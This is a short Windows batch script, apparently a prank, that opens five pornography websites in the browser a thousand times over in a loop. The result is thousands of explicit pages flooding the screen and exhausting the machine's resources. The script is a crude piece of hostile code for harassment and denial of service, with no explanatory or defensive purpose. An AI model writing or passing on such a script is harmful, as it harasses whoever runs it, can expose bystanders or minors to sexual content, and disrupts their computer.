@echo off
set count=0

:open_browser
start "" "www.pornhub.com"
start "" "www.xnxx.com"
start "" "www.xvideos.com"
start "" "www.porn.com"
start "" "www.sex.com"

set /a count+=1
if %count% lss 1000 goto open_browser

